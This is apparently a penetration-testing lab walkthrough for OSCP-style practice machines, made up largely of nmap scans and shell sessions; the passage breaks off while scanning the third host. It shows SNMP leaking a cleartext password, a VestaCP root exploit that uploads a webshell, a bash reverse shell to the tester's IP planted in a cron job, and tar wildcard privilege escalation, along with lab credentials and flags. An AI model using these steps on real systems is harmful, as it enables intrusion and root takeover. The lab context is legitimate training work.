2525/tcp open  smtp     Exim smtpd 4.90_1
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.161], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2024-12-06T16:51:09+00:00; -1m37s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 216
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolOld, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsTransactions, ODBCClient, FoundRows, Support41Auth, InteractiveClient, LongPassword, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsCompression, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 18vgNc\x06V3]Aj=8e\x05Xq%'
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: oscp.exam &mdash; Coming Soon
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.119.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/6%OT=21%CT=1%CU=35187%PV=Y%DS=4%DC=T%G=Y%TM=6753
OS:2BE1%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=A)
OS:OPS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578
OS:ST11NW7%O6=M578ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
OS:ECN(R=Y%DF=Y%T=40%W=7210%O=M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -30s, deviation: 48s, median: -31s

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   37.26 ms 192.168.45.1
2   37.20 ms 192.168.45.254
3   37.28 ms 192.168.251.1
4   37.44 ms 192.168.119.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.19 seconds

entering port 80 on the browser indicated that the server was controlled by vesta
port 8083 redirected to a https site with a login interface. I could not bruteforce brcause all attemps failed.

I ran snmpwalk to know if I can find some interesting things.

┌──(kali㉿kali)-[~]
└─$ snmpwalk -v2c -c public 192.168.119.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
MIB search path: /home/kali/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password-cmd" = STRING: "\"jack:3PUKsX98BMupBiCf\" | chpasswd"
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."reset-password-cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."reset-password-cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendExecType."reset-password-cmd" = INTEGER: shell(2)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."reset-password-cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStorage."reset-password-cmd" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendStatus."reset-password-cmd" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."reset-password-cmd" = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."reset-password-cmd" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password" = INTEGER: 256
NET-SNMP-EXTEND-MIB::nsExtendResult."reset-password-cmd" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password".1 = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password-cmd".1 = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
                                                                                                                                                                            
I found password and username for Jack (For it to work, I changed jack to Jack)

I was able to login to the platform with the password. User Jack is a normal user and not admin or root

I searched for exploit for exploit to get root privilege. I found a python exploit I executed on a python virtual environment on Linux.

https://github.com/rekter0/exploits/blob/master/VestaCP/vestaROOT.py
https://github.com/rekter0/exploits/blob/master/VestaCP/VestaFuncs.py


┌──(oscpc)─(kali㉿kali)-[~/oscpc]
└─$ python3 vestaROOT.py https://192.168.162.156:8083 Jack 3PUKsX98BMupBiCf 
[+] Logged in as Jack
[!] 9iey8rwhrz.poc not found, creating one...
[+] 9iey8rwhrz.poc added
[+] 9iey8rwhrz.poc found, looking up webshell
[!] webshell not found, creating one..
[+] Webshell uploaded
[!] Mail domain not found, creating one..
[+] Mail domain created
[+] Mail account created
[+] root shell possibly obtained
# whoami
root

# hostname
oscp.exam

# id
uid=0(root) gid=0(root) groups=0(root)

# id Jack
uid=1003(Jack) gid=1003(Jack) groups=1003(Jack)

Though the shell is not interactive and I cannot login as Jack in ssh because the account was set as no login
I had to reset everything, then add Jack to sudo group and root group

# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
ftp:x:115:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:116:121::/var/cache/bind:/usr/sbin/nologin
dovecot:x:117:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:118:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
debian-spamd:x:119:124::/var/lib/spamassassin:/bin/sh
admin:x:1002:1002:admin@oscp.exam:/home/admin:/bin/bash
Debian-snmp:x:120:125::/var/lib/snmp:/bin/false
Jack:x:1003:1003:jack@oscp.exam:/home/Jack:/usr/sbin/nologin

# chsh -s /bin/bash Jack 

# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
nginx:x:112:116:nginx user,,,:/nonexistent:/bin/false
clamav:x:113:117::/var/lib/clamav:/bin/false
Debian-exim:x:114:118::/var/spool/exim4:/usr/sbin/nologin
ftp:x:115:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:116:121::/var/cache/bind:/usr/sbin/nologin
dovecot:x:117:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:118:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
debian-spamd:x:119:124::/var/lib/spamassassin:/bin/sh
admin:x:1002:1002:admin@oscp.exam:/home/admin:/bin/bash
Debian-snmp:x:120:125::/var/lib/snmp:/bin/false
Jack:x:1003:1003:jack@oscp.exam:/home/Jack:/bin/bash

# usermod -aG root Jack

# usermod -aG sudo Jack

# id Jack
uid=1003(Jack) gid=1003(Jack) groups=1003(Jack),0(root),27(sudo)

# 

──(kali㉿kali)-[~/oscpc]
└─$ ssh Jack@192.168.162.156
Jack@192.168.162.156's password: 
Permission denied, please try again.
Jack@192.168.162.156's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  7 03:36:23 EST 2024

  System load:  0.06               Processes:             183
  Usage of /:   12.6% of 28.45GB   Users logged in:       0
  Memory usage: 85%                IP address for ens160: 192.168.162.156
  Swap usage:   1%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

167 updates can be applied immediately.
146 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

Jack@oscp:~$ whoami
Jack
Jack@oscp:~$ hostname
oscp.exam
Jack@oscp:~$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.162.156  netmask 255.255.255.0  broadcast 192.168.162.255
        inet6 fe80::250:56ff:fe9e:fd0e  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:9e:fd:0e  txqueuelen 1000  (Ethernet)
        RX packets 1040  bytes 113108 (113.1 KB)
        RX errors 0  dropped 10  overruns 0  frame 0
        TX packets 933  bytes 882468 (882.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 929  bytes 105552 (105.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 929  bytes 105552 (105.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Jack@oscp:~$ id
uid=1003(Jack) gid=1003(Jack) groups=1003(Jack),0(root),27(sudo)
Jack@oscp:~$ sudo -l
[sudo] password for Jack: 
Matching Defaults entries for Jack on oscp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep=VESTA

User Jack may run the following commands on oscp:
    (ALL : ALL) ALL
Jack@oscp:~$ sudo -i
root@oscp:~# pwd
/root
root@oscp:~# cat proof.txt
2f3e83b480ffdcf33b386a4ed9925785
root@oscp:~# cat /home/Jack/local.txt
3dba81b7a485728a9bed40c3ea656397
root@oscp:~# 


.157 Charlie

                                                                                                                                                                           
┌──(kali㉿kali)-[~/oscpc]
└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.162.157
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 10:37 CET
Nmap scan report for 192.168.162.157
Host is up (0.046s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.161
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/7%OT=21%CT=1%CU=34487%PV=Y%DS=4%DC=T%G=Y%TM=6754
OS:178C%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW7%O2=M578S
OS:T11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)WIN(W1=
OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=
OS:M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   73.96 ms 192.168.45.1
2   74.48 ms 192.168.45.254
3   74.52 ms 192.168.251.1
4   74.74 ms 192.168.162.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.02 seconds
                                                                

Port 20000 redirected me to a https traffic and presented to me a login form.
 I also logged in as anonymous to port 21 and downloaded the backup file in the directory using 'get' function. 

 ┌──(kali㉿kali)-[~/oscpc]
└─$ ftp 192.168.162.157

Connected to 192.168.162.157.
220 (vsFTPd 3.0.5)
Name (192.168.162.157:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10100|)
150 Here comes the directory listing.
drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
226 Directory send OK.
ftp> Get backup
ftp> get backup
local: backup remote: backup
229 Entering Extended Passive Mode (|||10092|)
550 Failed to open file.
ftp> cd backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||10096|)
150 Here comes the directory listing.
-rw-r--r--    1 114      120        145831 Nov 02  2022 BROCHURE-TEMPLATE.pdf
-rw-r--r--    1 114      120        159765 Nov 02  2022 CALENDAR-TEMPLATE.pdf
-rw-r--r--    1 114      120        336971 Nov 02  2022 FUNCTION-TEMPLATE.pdf
-rw-r--r--    1 114      120        739052 Nov 02  2022 NEWSLETTER-TEMPLATE.pdf
-rw-r--r--    1 114      120        888653 Nov 02  2022 REPORT-TEMPLATE.pdf
226 Directory send OK.
ftp> get BROCHURE-TEMPLATE.pdf
local: BROCHURE-TEMPLATE.pdf remote: BROCHURE-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10098|)
150 Opening BINARY mode data connection for BROCHURE-TEMPLATE.pdf (145831 bytes).
100% |**************************|   142 KiB  203.43 KiB/s    00:00 ETA
226 Transfer complete.
145831 bytes received in 00:00 (193.98 KiB/s)
ftp> get CALENDAR-TEMPLATE.pdf
local: CALENDAR-TEMPLATE.pdf remote: CALENDAR-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10096|)
150 Opening BINARY mode data connection for CALENDAR-TEMPLATE.pdf (159765 bytes).
100% |**************************|   156 KiB    1.05 MiB/s    00:00 ETA
226 Transfer complete.
159765 bytes received in 00:00 (871.96 KiB/s)
ftp> get FUNCTION-TEMPLATE.pdf
local: FUNCTION-TEMPLATE.pdf remote: FUNCTION-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10092|)
150 Opening BINARY mode data connection for FUNCTION-TEMPLATE.pdf (336971 bytes).
100% |**************************|   329 KiB    1.56 MiB/s    00:00 ETA
226 Transfer complete.
336971 bytes received in 00:00 (1.32 MiB/s)
ftp> get NEWSLETTER-TEMPLATE.pdf
local: NEWSLETTER-TEMPLATE.pdf remote: NEWSLETTER-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10090|)
150 Opening BINARY mode data connection for NEWSLETTER-TEMPLATE.pdf (739052 bytes).
100% |**************************|   721 KiB    1.92 MiB/s    00:00 ETA
226 Transfer complete.
739052 bytes received in 00:00 (1.73 MiB/s)
ftp> get REPORT-TEMPLATE.pdf
local: REPORT-TEMPLATE.pdf remote: REPORT-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10099|)
150 Opening BINARY mode data connection for REPORT-TEMPLATE.pdf (888653 bytes).
100% |**************************|   867 KiB    2.13 MiB/s    00:00 ETA
226 Transfer complete.


Analysing the files on a vscode, I found some name as authors. names like robert and cassie
I tried cassie/cassie on the login form and got access to the platform.

I looked around the application and found a place I can execute a code as cron job. I copied a TCP reverse shell payload to it, executed it and got a reversed shell as cassie.
bash -c 'bash -i >& /dev/tcp/192.168.45.161/4444 0>&1 &'

┌──(kali㉿kali)-[~/oscpc]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.161] from (UNKNOWN) [192.168.162.157] 39050
bash: cannot set terminal process group (1017): Inappropriate ioctl for device
bash: no job control in this shell
cassie@oscp:~/.tmp$ whoami
whoami
cassie
cassie@oscp:~/.tmp$ hostname
hostname
oscp
cassie@oscp:~/.tmp$ ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.162.157  netmask 255.255.255.0  broadcast 192.168.162.255
        ether 00:50:56:9e:4a:f0  txqueuelen 1000  (Ethernet)
        RX packets 138695  bytes 16923769 (16.9 MB)
        RX errors 0  dropped 1065  overruns 0  frame 0
        TX packets 134891  bytes 40719092 (40.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 805  bytes 63524 (63.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 805  bytes 63524 (63.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

cassie@oscp:~/.tmp$ cd ..

For privilege escalation, I used this command to find a wildcard cron job that is executing every 2mins

cassie@oscp:/tmp$ grep "CRON" /var/log/syslog
grep "CRON" /var/log/syslog
Dec  7 10:40:07 oscp CRON[1429]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Dec  7 10:40:07 oscp CRON[1428]: (CRON) info (No MTA installed, discarding output)
Dec  7 10:42:01 oscp CRON[1438]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Dec  7 10:42:01 oscp CRON[1437]: (CRON) info (No MTA installed, discarding output)
Dec  7 10:44:01 oscp CRON[1449]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Dec  7 10:44:01 oscp CRON[1448]: (CRON) info (No MTA installed, discarding output)
Dec  7 10:46:01 oscp CRON[1456]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Dec  7 10:46:01 oscp CRON[1455]: (CRON) info (No MTA installed, discarding output)
Dec  7 10:48:01 oscp CRON[11544]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Dec  7 10:48:01 oscp CRON[11543]: (CRON) info (No MTA installed, discarding output)
Dec  7 10:50:01 oscp CRON[11622]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Dec  7 10:50:01 oscp CRON[11621]: (CRON) info (No MTA installed, discarding output)
Dec  7 10:52:01 oscp CRON[11627]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)

With the help of this document https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
I moved into the /opt/admin directory and added a file that added my current user to sudoers group that can execute ALL without password.

After 2 mins, the cron job executed and my user was added to the sudoers group. I used it to get a root shell.

cassie@oscp:/opt/admin$ sudo -l
sudo -l
User cassie may run the following commands on oscp:
    (root) NOPASSWD: ALL
cassie@oscp:/opt/admin$ sudo -i
sudo -i
whoami
root
hostname
oscp
cd /root
pwd
/root
ls
proof.txt
snap
cat proof.txt
95a122a82a209d6b7831259710eae6a7
cat /home/cassie/local.txt
33ce0b0e9d16b09f40c53ccca119b97e

.155 Pascha

──(kali㉿kali)-[~/oscpc]
└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.162.155
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 18:10 CET
Nmap scan report for 192.168.162.155
Host is up (0.037s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
9099/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK 
|     Server: Mobile Mouse Server 
|     Content-Type: text/html 
|     Content-Length: 321
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9099-TCP:V=7.94SVN%I=7%D=12/7%Time=675481C2%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mou
SF:se\x20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x
SF:20321\r\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewpor
SF:t\"\x20content=\"width=device-width,user-scalable=no\"\x20/></HEAD><BOD
SF:Y\x20BGCOLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sa
SF:ns-serif;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\
SF:x20>The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20
SF:receive\x20your\x20request\.</p></BODY></HTML>\r\n")%r(FourOhFourReques
SF:t,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20Serv
